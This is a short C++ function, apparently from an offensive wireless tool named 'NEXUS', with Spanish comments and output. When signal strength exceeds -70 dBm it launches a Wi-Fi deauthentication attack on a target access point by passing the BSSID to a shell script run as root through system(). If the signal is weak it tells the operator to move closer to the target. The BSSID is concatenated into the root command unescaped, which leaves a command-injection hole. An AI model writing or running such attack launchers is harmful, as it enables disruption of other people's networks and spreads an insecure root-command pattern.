#include <iostream>
#include <string>

void execute_tactical_deauth(std::string bssid, int power) {
    // Si la señal es mayor a -70dBm, el ataque será efectivo
    if (power > -70) {
        std::cout << "[*] NEXUS: Señal óptima (" << power << "dBm). Iniciando Deauth...\n";
        std::string cmd = "su -c 'nexus_deauth.sh " + bssid + "'";
        system(cmd.c_str());
    } else {
        std::cout << "\033[1;31m[!] ALERTA: Señal débil. Acércate al objetivo para evitar fallos.\033[0m\n";
    }
}
